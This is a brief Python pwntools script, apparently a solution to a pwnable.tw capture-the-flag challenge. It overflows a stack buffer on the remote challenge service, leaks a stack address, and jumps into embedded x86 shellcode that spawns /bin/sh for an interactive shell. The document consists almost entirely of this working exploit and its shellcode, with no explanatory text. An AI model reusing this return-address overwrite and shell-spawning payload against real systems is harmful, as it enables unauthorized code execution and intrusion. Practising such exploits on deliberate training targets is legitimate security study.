from pwn import *
io = remote('chall.pwnable.tw',10000)
#io = remote('127.0.0.1',4000)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

io.recvuntil(':')
io.send('a'*19+'.'+p32(0x0804808b))

io.recvuntil('.')
a = u32(io.recv()[4:8])-0x1c
print(hex(a))
io.send(shellcode.ljust(44,'\x90')+p32(a))


io.interactive()
